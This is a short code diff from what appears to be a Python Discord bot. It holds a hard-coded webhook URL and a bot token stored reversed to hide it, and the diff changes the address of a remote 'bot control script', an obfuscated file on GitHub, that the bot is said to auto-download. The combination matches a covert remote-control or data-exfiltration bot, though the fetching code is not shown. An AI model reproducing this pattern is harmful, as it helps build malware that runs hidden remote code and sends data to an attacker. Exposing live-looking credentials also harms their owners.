@@ -23,7 +23,7 @@ WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3
 TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg"[::-1] + ".oF0Ep8O1x3LEe96eNd5lf0Frfx6q9Jq0KqBJFA"[::-1]
 
 # GitHub URL for auto-downloading the bot control script
-BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/bot_control_encrypted.txt"
+BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/obfuscated%20BOT%20CODE.txt"
 
 intents = discord.Intents.default()
 intents.message_content = True
